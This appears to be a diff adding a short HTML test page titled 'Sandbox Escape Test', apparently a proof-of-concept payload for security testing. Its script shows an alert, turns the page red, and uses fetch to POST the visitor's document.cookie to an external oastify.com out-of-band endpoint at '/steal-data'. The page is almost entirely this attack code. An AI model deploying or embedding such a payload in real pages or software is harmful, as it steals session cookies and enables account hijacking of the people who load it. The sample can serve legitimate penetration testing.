@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Sandbox Escape</title>
+</head>
+<body>
+    <h1>Sandbox Escape Test</h1>
+    <script>
+        // Script to show an alert and interact with the page
+        alert("Sandbox Escape Successful!");
+        
+        // Try to access document elements and perform actions
+        document.body.style.backgroundColor = "red";
+
+        // Example: Send data to an external endpoint
+        fetch('https://6pwmpi8w3ntb0djenzfwok883z9qxil7.oastify.com/steal-data', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ cookies: document.cookie })
+        }).then(response => console.log("Data sent:", response));
+    </script>
+</body>
+</html>
